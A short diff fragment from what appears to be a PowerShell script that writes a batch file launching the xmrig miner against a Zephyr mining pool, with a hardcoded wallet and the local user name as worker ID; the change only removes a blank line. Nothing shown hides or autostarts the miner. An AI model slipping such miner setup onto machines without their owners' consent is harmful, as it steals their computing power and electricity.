@@ -11,7 +11,6 @@ $folderPath = "C:\CSANGXMRIG\"
 $batContent = @"
 cd %~dp0
 xmrig.exe -o zephyr.miningocean.org:5332 -u ZEPHs7NJgxsL55Zfyj2Yd1QgHT7HQvXjtgxrus6UPZbQ7ZJjcSAASu4cE7cHDzdUvxXBRkuV3V3rgdEHA3W6gqCTXbGRujkJ24H -p $userName -a rx/0 -k -t 8
-
 pause
 "@
 $batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
